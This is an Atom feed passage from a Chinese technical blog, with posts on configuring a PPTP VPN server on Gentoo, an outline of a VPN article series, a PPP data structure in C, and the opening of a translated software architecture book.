<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>芯机智</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://demonelf.github.io/"/>
  <updated>2019-08-29T06:29:11.505Z</updated>
  <id>http://demonelf.github.io/</id>
  
  <author>
    <name>madhex</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Gentoo下利用pptpd搭建PPTP服务器 </title>
    <link href="http://demonelf.github.io/NETWORK/Gentoo%E4%B8%8B%E5%88%A9%E7%94%A8pptpd%E6%90%AD%E5%BB%BAPPTP%E6%9C%8D%E5%8A%A1%E5%99%A8%20.html"/>
    <id>http://demonelf.github.io/NETWORK/Gentoo下利用pptpd搭建PPTP服务器 .html</id>
    <published>2019-08-29T06:30:48.766Z</published>
    <updated>2019-08-29T06:29:11.505Z</updated>
    
    <content type="html"><![CDATA[<p>首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和 netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。<br>接着安装必要软件</p><blockquote><p>emerge ppp</p><p>emerge pptpd</p></blockquote><p>然后修改配置文件<br>先是pptpd的配置文件 /etc/pptpd.conf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ppp /usr/sbin/pppd</div><div class="line">option /etc/ppp/options.pptpd</div><div class="line">logwtmp</div><div class="line">localip 172.16.0.1</div><div class="line">remoteip 172.16.0.2-254</div></pre></td></tr></table></figure></p><p>接着是ppp的配置文件 /etc/ppp/options.pptpd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ms-dns 8.8.8.8</div><div class="line">ms-dns 8.8.4.4</div></pre></td></tr></table></figure></p><p>最后是用户密码文件 /etc/ppp/chap-secret<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#name server secret ip</div><div class="line">test@test.com pptpd test *</div></pre></td></tr></table></figure></p><p>第一项是登录vpn时使用的用户名，第二项是vpn服务器名（pptpd，l2tpd，xl2tpd等，也可以用*号），第三项是密码，第四项是分配给客户端的ip，如果是＊号，vpn服务器则会从自己的配置文件中选择一个ip分配给客户端。 </p><p>开启系统的封包转发： </p><blockquote><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p></blockquote><p>最后别忘了启动pptpd服务</p><blockquote><p>/etc/init.d/pptpd start </p></blockquote><p>gentoo下客户端示例</p><blockquote><p>pptp 192.168.2.12 user test@test.com password test</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和 netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。&lt;br&gt;接着安装必要软件&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;emerge ppp&lt;/p&gt;
&lt;p&gt;emerge pptpd&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后修改配置文件&lt;br&gt;先是pptpd的配置文件 /etc/pptpd.conf&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ppp /usr/sbin/pppd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;option /etc/ppp/options.pptpd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;logwtmp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;localip 172.16.0.1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;remoteip 172.16.0.2-254&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>vpn系列文章概述</title>
    <link href="http://demonelf.github.io/VPN%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%94%E8%8A%B1%E5%85%AB%E9%97%A8/vpn%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%E6%A6%82%E8%BF%B0.html"/>
    <id>http://demonelf.github.io/VPN系列之五花八门/vpn系列文章概述.html</id>
    <published>2019-08-29T05:56:12.685Z</published>
    <updated>2019-08-29T05:27:31.371Z</updated>
    
    <content type="html"><![CDATA[<h2 id="我们要讨论的相关vpn"><a href="#我们要讨论的相关vpn" class="headerlink" title="我们要讨论的相关vpn"></a>我们要讨论的相关vpn</h2><ol><li>l2tp</li><li>pptp</li><li>ipsec</li><li>websocket vpn</li><li>dns vpn</li><li>mpls vpn</li></ol><p>由于ppp协议是以上大部分vpn的核心技术,所以我们还要讨论ppp相关技术.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;我们要讨论的相关vpn&quot;&gt;&lt;a href=&quot;#我们要讨论的相关vpn&quot; class=&quot;headerlink&quot; title=&quot;我们要讨论的相关vpn&quot;&gt;&lt;/a&gt;我们要讨论的相关vpn&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;l2tp&lt;/li&gt;
&lt;li&gt;pptp&lt;/li&gt;
&lt;li&gt;ipsec&lt;/li&gt;
&lt;li&gt;websocket vpn&lt;/li&gt;
&lt;li&gt;dns vpn&lt;/li&gt;
&lt;li&gt;mpls vpn&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;由于ppp协议是以上大部分vpn的核心技术,所以我们还要讨论ppp相关技术.&lt;/p&gt;
    
    </summary>
    
      <category term="VPN系列之五花八门" scheme="http://demonelf.github.io/categories/VPN%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%94%E8%8A%B1%E5%85%AB%E9%97%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>ppp协议总结</title>
    <link href="http://demonelf.github.io/VPN%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%94%E8%8A%B1%E5%85%AB%E9%97%A8/ppp%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93.html"/>
    <id>http://demonelf.github.io/VPN系列之五花八门/ppp协议总结.html</id>
    <published>2019-08-29T05:22:47.788Z</published>
    <updated>2019-08-29T05:20:54.174Z</updated>
    
    <content type="html"><![CDATA[<h2 id="协议规范"><a href="#协议规范" class="headerlink" title="协议规范"></a>协议规范</h2><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ppp_info</span>&#123;</span></div><div class="line"><span class="keyword">int</span> unit;<span class="comment">/**/</span></div><div class="line"><span class="keyword">int</span> dev_fd;<span class="comment">/**/</span></div><div class="line"><span class="keyword">int</span> lcp_fd;<span class="comment">/**/</span></div><div class="line"><span class="keyword">int</span> ppp_fd;<span class="comment">/**/</span></div><div class="line"><span class="keyword">int</span> remote_id;<span class="comment">/**/</span></div><div class="line"><span class="keyword">char</span>*user;<span class="comment">/* Username for authentication */</span></div><div class="line"><span class="keyword">char</span>*passwd;<span class="comment">/* Password for authentication */</span></div><div class="line"><span class="keyword">char</span> *ifname;</div><div class="line"><span class="keyword">char</span> attach_inter[<span class="number">16</span>];</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> distance;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> weight;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> gateway;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> dns;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> auth;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> auth_type;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> down_flag;<span class="comment">//避免PPP主动down掉和手动清除冲突</span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> unique;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> dns_value;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> wins_value;</div><div class="line"><span class="keyword">char</span> usergrp[MAXNAMELEN];</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">prefix_ipv4</span> <span class="title">localaddr</span>;</span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> peer_address;<span class="comment">//tunnip</span></div><div class="line"><span class="keyword">int</span> lcp_detect_interval_time;<span class="comment">//for change interval time of lcp echo request</span></div><div class="line"><span class="keyword">int</span> lcp_detect_lost_times;<span class="comment">//for change times of no respons lcp echo request</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> * <span class="title">lcp_thread</span>;</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> * <span class="title">ipcp_rthread</span>;</span></div><div class="line">    <span class="keyword">void</span> *conn;</div><div class="line">    <span class="keyword">void</span> *priv_data;</div><div class="line">    <span class="keyword">int</span> natid;</div><div class="line"><span class="keyword">int</span> mtu;</div><div class="line">Ppp_if_type iftype;</div><div class="line"><span class="keyword">int</span> (*manage_auto_down) (<span class="keyword">char</span> *ifname);</div><div class="line"><span class="keyword">int</span> (*ipcp_up_cb) (struct ppp_cb_info *cb_info);</div><div class="line"><span class="keyword">int</span> (*ipcp_down_cb) (struct ppp_cb_info *cb_info);</div><div class="line"><span class="keyword">int</span> (*lcp_auth) (<span class="keyword">char</span> *name, <span class="keyword">char</span> *group, <span class="keyword">char</span> *password, <span class="keyword">unsigned</span> <span class="keyword">char</span> *challenge, <span class="keyword">int</span> unit, <span class="keyword">int</span> type);</div><div class="line"><span class="keyword">int</span> (*check_rqci)(__u32 addr);</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>void LcpLinkFailure (f)</p><p>lcp_close(f-&gt;unit, “Peer not responding”);</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;协议规范&quot;&gt;&lt;a href=&quot;#协议规范&quot; class=&quot;headerlink&quot; title=&quot;协议规范&quot;&gt;&lt;/a&gt;协议规范&lt;/h2&gt;&lt;h2 id=&quot;实现原理&quot;&gt;&lt;a href=&quot;#实现原理&quot; class=&quot;headerlink&quot; title=&quot;实现原理&quot;&gt;&lt;/a&gt;实现原理&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ppp_info&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; unit;			&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; dev_fd;			&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; lcp_fd;			&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ppp_fd;			&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; remote_id;		&lt;span class=&quot;comment&quot;&gt;/**/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;	*user;		&lt;span class=&quot;comment&quot;&gt;/* Username for authentication */&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt;	*passwd;	&lt;span class=&quot;comment&quot;&gt;/* Password for authentication */&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *ifname;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; attach_inter[&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; distance;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; weight;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; gateway;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; dns;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; auth;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; auth_type;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; down_flag;			&lt;span class=&quot;comment&quot;&gt;//避免PPP主动down掉和手动清除冲突&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; unique;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; dns_value;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; wins_value;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; usergrp[MAXNAMELEN];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;prefix_ipv4&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;localaddr&lt;/span&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; peer_address;			&lt;span class=&quot;comment&quot;&gt;//tunnip&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; lcp_detect_interval_time;		&lt;span class=&quot;comment&quot;&gt;//for change interval time of lcp echo request&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; lcp_detect_lost_times;			&lt;span class=&quot;comment&quot;&gt;//for change times of no respons lcp echo request&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;thread&lt;/span&gt; * &lt;span class=&quot;title&quot;&gt;lcp_thread&lt;/span&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;thread&lt;/span&gt; * &lt;span class=&quot;title&quot;&gt;ipcp_rthread&lt;/span&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *conn;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *priv_data;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; natid;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; mtu;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	Ppp_if_type iftype;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; (*manage_auto_down) (&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *ifname);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; (*ipcp_up_cb) (struct ppp_cb_info *cb_info);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; (*ipcp_down_cb) (struct ppp_cb_info *cb_info);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; (*lcp_auth) (&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *name, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *group, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *password, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *challenge, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; unit, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; type);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; (*check_rqci)(__u32 addr);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="VPN系列之五花八门" scheme="http://demonelf.github.io/categories/VPN%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%94%E8%8A%B1%E5%85%AB%E9%97%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>软件架构模式</title>
    <link href="http://demonelf.github.io/DEVELOP/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F.html"/>
    <id>http://demonelf.github.io/DEVELOP/软件架构模式.html</id>
    <published>2019-08-29T05:14:34.950Z</published>
    <updated>2019-08-29T05:12:37.348Z</updated>
    
    <content type="html"><![CDATA[<p><img src="images/cover.png" alt="cover"></p><p>软件架构模式  Mark Richards 著<br>版权归 © 2015 O’Reilly Media, Inc. 所有.      </p><p>原书发布链接为<a href="http://www.oreilly.com/programming/free/software-architecture-patterns.csp" target="_blank" rel="external">Software Architecture Patterns</a>.</p><p><strong>译员信息</strong></p><p>本书的译员均来自 开发技术前线 <a href="http://www.devtf.cn" target="_blank" rel="external">www.devtf.cn</a>。   </p><table><thead><tr><th>译者</th><th>个人简介</th></tr></thead><tbody><tr><td><a href="https://github.com/bboyfeiyu" target="_blank" rel="external">Mr.Simple</a></td><td>乐于分享，热爱开源的工程师，<a href="http://blog.csdn.net/bboyfeiyu" target="_blank" rel="external">个人博客</a></td></tr><tr><td><a href="https://github.com/chaossss" target="_blank" rel="external">chaossss</a></td><td>追风筝的吃货，汪～。<a href="http://blog.csdn.net/u012403246/" target="_blank" rel="external">个人博客</a></td></tr><tr><td><a href="https://github.com/allenlsy" target="_blank" rel="external">Allenlsy</a></td><td>计算机科学爱好者，Rails程序员。<a href="allenlsy.com">个人博客</a></td></tr><tr><td><a href="https://github.com/BillonWang" target="_blank" rel="external">BillonWang</a></td><td>做好玩的事情，交好玩的朋友。<a href="www.woaichirou.com">个人博客</a></td></tr><tr><td><a href="https://github.com/dupengwei" target="_blank" rel="external">dupengwei</a></td><td>乐于分享的移动互联网开发工程师</td></tr><tr><td><a href="https://github.com/ht1348092" target="_blank" rel="external">Charli Hu</a></td><td>喜欢英语，不放弃编程的菇凉。</td></tr></tbody></table><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><a href="#introdution">简介</a> </li><li><a href="#chapter1">第一章 分层架构</a></li><li><a href="#chapter2">第二章 事件驱动架构</a></li><li><a href="#chapter3">第三章 微内核架构</a></li><li><a href="#chapter4">第四章 微服务架构</a></li><li><a href="#chapter5">第五章 基于空间的架构</a></li><li><a href="#appendix">附录A</a></li><li><a href="#author">关于作者</a></li></ul><p><b id="introdution"></b></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>对程序员来说很常见一种情况是在没有合理的程序架构时就开始编程，没有一个清晰的和定义好的架构的时候，大多数开发者和架构师通常会使用标准式的传统分层架构模式（也被称为多层架构）——通过将源码模块分割为几个不同的层到不同的包中。不幸的是，这种编码方式会导致一系列没有组织性的代码模块，这些模块缺乏明确的规则、职责和同其他模块之间的关联。这通常被称为架构大泥球。  </p><p>应用程序缺乏合理的架构一般会导致程序过度耦合、容易被破坏、难以应对变化，同时很难有一个清晰的版本或者方向性。这样的结果是，如果你没有充分理解程序系统里每个组件和模块，就很难定义这个程序的结构特征。有关于程序的部署和维护的基本问题都难以回答，比如：程序架构是什么规模?应用程序有什么性能特点?应用程序有多容易应对变化?应用程序的部署特点是什么?架构是如何反应的?</p><p>架构模式帮助你定义应用程序的基本特征和行为。例如，一些架构模式会让程序自己自然而然地朝着具有良好伸缩性的方向发展，而其他架构模式会让程序朝着高度灵活的方向发展。知道了这些特点，了解架构模式的优点和缺点是非常必要的，它帮助我们选择一个适合自己特定的业务需求和目标的的程序。<br>​<br>作为一个架构师,你必须证明你的架构模式的决策是正确的,特别是当需要选择一个特定的体系结构模式或方法的时候。这本迷你书的目的就是给你足够的信息让你去做出正确的架构决策。</p><p><b id="chapter1"></b></p><h2 id="第一章-分层架构"><a href="#第一章-分层架构" class="headerlink" title="第一章 分层架构"></a>第一章 分层架构</h2><p>分层架构是一种很常见的架构模式，它也叫N层架构。这种架构是大多数Jave EE应用的实际标准，因此很多的架构师，设计师，还有程序员都知道它。许多传统IT公司的组织架构和分层模式十分的相似。所以它很自然的成为大多数应用的架构模式。</p><h3 id="模式分析"><a href="#模式分析" class="headerlink" title="模式分析"></a>模式分析</h3><p>分层架构模式里的组件被分成几个平行的层次，每一层都代表了应用的一个功能(展示逻辑或者业务逻辑)。尽管分层架构没有规定自身要分成几层几种，大多数的结构都分成四个层次:展示层，业务层，持久层，和数据库层。如表1-1，有时候，业务层和持久层会合并成单独的一个业务层，尤其是持久层的逻辑绑定在业务层的组件当中。因此，有一些小的应用可能只有3层，一些有着更复杂的业务的大应用可能有5层或者更多的分层。</p><p>分层架构中的每一层都着特定的角色和职能。举个例子，展示层负责处理所有的界面展示以及交互逻辑，业务层负责处理请求对应的业务。架构里的层次是具体工作的高度抽象，它们都是为了实现某种特定的业务请求。比如说展示层并不需要关心怎样得到用户数据，它只需在屏幕上以特定的格式展示信息。业务层并不关心要展示在屏幕上的用户数据格式，也不关心这些用户数据从哪里来。它只需要从持久层得到数据，执行与数据有关的相应业务逻辑，然后把这些信息传递给展示层。</p><p><img src="images/1-1.png" alt="1-1">    </p><p>分层架构的一个突出特性是组件间关注点分离 (separation of concerns)。一个层中的组件只会处理本层的逻辑。比如说，展示层的组件只会处理展示逻辑，业务层中的组件只会去处理业务逻辑。多亏了组件分离，让我们更容易构造有效的角色和强力的模型。这样应用变的更好开发，测试，管理和维护。</p><h3 id="关键概念"><a href="#关键概念" class="headerlink" title="关键概念"></a>关键概念</h3><p>注意表1-2中每一层都是封闭的。这是分层架构中非常重要的特点。这意味request必须一层一层的传递。举个例子，从展示层传递来的请求首先会传递到业务层，然后传递到持久层，最后才传递到数据层。</p><p><img src="images/1-2.png" alt="1-2">     